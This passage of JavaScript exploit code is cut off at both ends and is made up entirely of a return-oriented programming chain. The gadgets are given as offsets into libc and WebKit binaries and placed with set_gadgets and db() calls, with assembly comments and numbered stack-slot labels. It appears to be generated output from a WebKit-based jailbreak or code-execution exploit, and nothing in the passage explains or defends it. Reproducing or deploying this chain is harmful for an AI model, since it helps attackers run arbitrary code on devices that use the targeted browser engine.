libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78024, //L307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78040, //L308
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L308:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78184, //L312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78152, //L310
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78168, //L311
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+78256, //L314
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78312, //L315
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L315:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78408, //L318
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L317:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78496, //L320
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78512, //L321
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+78664, //L324
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78696, //L326
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78648, //L323
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78680, //L325
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+78816, //L328
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78832, //L329
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+78800, //L327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+78920, //L331
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78976, //L332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L332:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+79096, //L334
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79128, //L336
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79112, //L335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+79288, //L340
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79240, //L337
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79256, //L338
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L337:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L339:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79344, //L341
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L341:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79448, //L343
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79480, //L345
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79464, //L344
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79640, //L349
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79592, //L346
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79608, //L347
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L346:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L347:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L348:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79696, //L350
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79800, //L352
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79832, //L354
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79816, //L353
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79992, //L358
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79944, //L355
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79960, //L356
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L355:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L356:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L357:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80048, //L359
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80152, //L361
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80184, //L363
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80168, //L362
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80256, //L364
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80272, //L365
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80432, //L369
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+80384, //L366
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80400, //L367
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L366:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L367:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L368:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80488, //L370
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L370:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80592, //L372
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80624, //L374
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80608, //L373
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80720, //L376
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80704, //L375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+80816, //L378
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L377:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L378:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+80904, //L380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+80920, //L381
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+81064, //L385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81032, //L383
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81048, //L384
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+81136, //L387
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L387:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81192, //L388
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L388:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81336, //L392
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L391:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L392:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+81424, //L394
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81440, //L395
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L395:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+81592, //L398
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81624, //L400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81576, //L397
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81608, //L399
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+81744, //L402
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81760, //L403
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+81728, //L401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+81864, //L404
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81880, //L405
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+81968, //L407
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82024, //L408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L408:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82096, //L411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82152, //L413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82256, //L415
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L414:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+792472,); //pop rcx
//L415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+82344, //L417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82360, //L418
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L418:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+82520, //L423
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82472, //L420
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82488, //L421
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L420:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L422:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82576, //L424
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+82680, //L426
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+82712, //L428
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82696, //L427
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+82872, //L432
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82824, //L429
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82840, //L430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L429:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L431:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82928, //L433
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83032, //L435
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83064, //L437
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83048, //L436
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83136, //L438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83152, //L439
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83312, //L443
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83264, //L440
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83280, //L441
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L440:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L441:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L442:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+83368, //L444
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L444:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83472, //L446
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83504, //L448
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83488, //L447
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83600, //L450
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83584, //L449
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+83696, //L452
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L451:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L452:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+83784, //L454
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83800, //L455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+83944, //L459
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83912, //L457
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83928, //L458
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84016, //L461
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L461:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84072, //L462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L462:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84168, //L465
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L464:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+84256, //L467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84272, //L468
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+84424, //L471
